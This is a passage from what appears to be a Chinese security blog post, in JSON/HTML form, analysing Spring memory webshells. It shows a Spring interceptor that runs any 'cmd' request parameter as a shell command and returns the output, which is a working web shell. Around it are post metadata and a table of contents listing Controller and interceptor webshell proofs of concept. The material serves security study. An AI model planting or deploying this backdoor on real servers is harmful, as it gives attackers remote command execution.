#F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HandlerInterceptor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> TestInterceptor  </span><span style=\"color: #F97583\">implements</span><span style=\"color: #B392F0\"> HandlerInterceptor &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">boolean</span><span style=\"color: #B392F0\"> preHandle(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> response</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> handler) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> url </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRequestURI();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\"> writer </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">boolean</span><span style=\"color: #B392F0\"> isLinux </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> osTyp </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getProperty(</span><span style=\"color: #FFAB70\">&quot;os.name&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (osTyp </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">osTyp</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toLowerCase()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;win&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                isLinux </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">false</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] cmds </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> isLinux </span><span style=\"color: #F97583\">?</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;sh&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;-c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">)&#125; </span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;cmd.exe&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;/c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">)&#125;;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\"> in </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Runtime</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRuntime()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">exec(cmds)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getInputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\"> s </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> Scanner(in)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">useDelimiter(</span><span style=\"color: #FFAB70\">&quot;\\\\A&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> output </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext() </span><span style=\"color: #F97583\">?</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next() </span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(output);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>测试其他 4 种方式也是成功的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709795113399-15ade1c7-1cb8-4be1-92b6-5f546d1c11cb.png#averageHue=%23dedddc&clientId=u8df47c52-911f-4&from=paste&height=513&id=uac6a0b89&originHeight=846&originWidth=2534&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=207982&status=done&style=none&taskId=u0eab628a-7133-4c47-9a84-8408883dbb5&title=&width=1535.7574869931836\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n","feature":true,"text":"1 Spring 特性0x01 综述简化来说就是 IOC 和 AOP，中文翻译是控制反转和切面编程。我个人理解：IOC 是把 java 类托管，我们就不需要自己...","permalink":"/post/Spring型内存马分析","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"锻刀的理论学习-SpringMemshell","slug":"锻刀的理论学习-SpringMemshell","count":1,"path":"api/categories/锻刀的理论学习-SpringMemshell.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-Spring-%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">1 Spring 特性</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E7%BB%BC%E8%BF%B0\"><span class=\"toc-text\">0x01 综述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-Spring-%E4%BB%A5%E5%8F%8A-SprinMVC\"><span class=\"toc-text\">0x02 Spring 以及 SprinMVC</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-IOC-%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">0x03 IOC 容器</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">2 Controller 型内存马</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-Controller%EF%BC%9F\"><span class=\"toc-text\">0x01 为什么是 Controller？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x02 实现分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x01-%E8%8E%B7%E5%8F%96%E5%88%B0%E4%B8%8A%E4%B8%8B%E6%96%87%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">1x01 获取到上下文内容</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%BB%E8%AE%A1%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">总计四种方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-ContextLoaderListener\"><span class=\"toc-text\">1 ContextLoaderListener</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-WebApplicationContextUtils\"><span class=\"toc-text\">2  WebApplicationContextUtils</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-RequestContextUtils\"><span class=\"toc-text\">3 RequestContextUtils</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-getAttribute\"><span class=\"toc-text\">4 getAttribute</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x02-%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C-Controller\"><span class=\"toc-text\">1x02 动态注册 Controller</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2x01-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%88%B0%E6%98%A0%E5%B0%84%E6%B3%A8%E5%86%8C%E5%99%A8\"><span class=\"toc-text\">2x01 如何获取到映射注册器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%92%88%E5%AF%B9%E4%BA%8E-RequestMappingHandlerMapping-%E6%98%A0%E5%B0%84%E5%99%A8%E7%9A%84%E8%8E%B7%E5%8F%96%E5%92%8C%E6%B3%A8%E5%86%8C\"><span class=\"toc-text\">针对于  RequestMappingHandlerMapping 映射器的获取和注册</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E6%9C%80%E7%BB%88%E5%AE%9E%E7%8E%B0-POC\"><span class=\"toc-text\">0x03 最终实现 POC</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#3-interceptor-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">3 interceptor 型内存马</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E4%BB%80%E4%B9%88%E6%98%AF-interceptor\"><span class=\"toc-text\">0x01 什么是 interceptor</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-interceptor-%E7%9A%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">0x02 interceptor 的调用流程</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-interceptor-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">0x03 interceptor 内存马的实现流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x01-%E8%8E%B7%E5%8F%96AbstractHandlerMapping\"><span class=\"toc-text\">1x01 获取AbstractHandlerMapping</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x02-%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C-interceptor\"><span class=\"toc-text\">1x02 动态注册 interceptor</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x03-%E5%AE%8C%E6%95%B4-POC\"><span class=\"toc-text\">1x03 完整 POC</span></a></li></ol></li></ol></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"JNDIRe0","uid":"537c41713ba96f6a58c6622bc871aefc","slug":"JNDIRe0","date":"2024-03-11T03:10:00.000Z","updated":"2024-06-28T15:09:18.348Z","comments":true,"path":"api/articles/JNDIRe0.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","text":"什么是 JNDI英文全写为：Java Naming and Directory Interface，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一...","permalink":"/post/JNDIRe0","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"锻刀的理论学习-JNDIRe0反序列化","slug":"锻刀的理论学习-JNDIRe0反序列化","count":1,"path":"api/categories/锻刀的理论学习-JNDIRe0反序列化.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JavaAgent型内存马分析","uid":"f0a5a2fed19b5df796d3c2712e650af6","slug":"JavaAgent内存马","date":"2024-03-06T09:50:51.000Z","updated":"2024-06-28T15:09:14.907Z","comments":true,"path":"api/articles/JavaAgent内存马.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","text":"1.什么是 javaAgent？Agent，意为“代理”java 是一种静态强类型的语言，在运行之前必须将其编译成.class 字节码，然后交给 JVM 去处理...","permalink":"/post/JavaAgent内存马","photos":[],"count_time":{"symbolsCount":"25k","symbolsTime":"23 mins."},"categories":[{"name":"锻刀的理论学习-javaAgent","slug":"锻刀的理论学习-javaAgent","count":1,"path":"api/categories/锻刀的理论学习-javaAgent.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}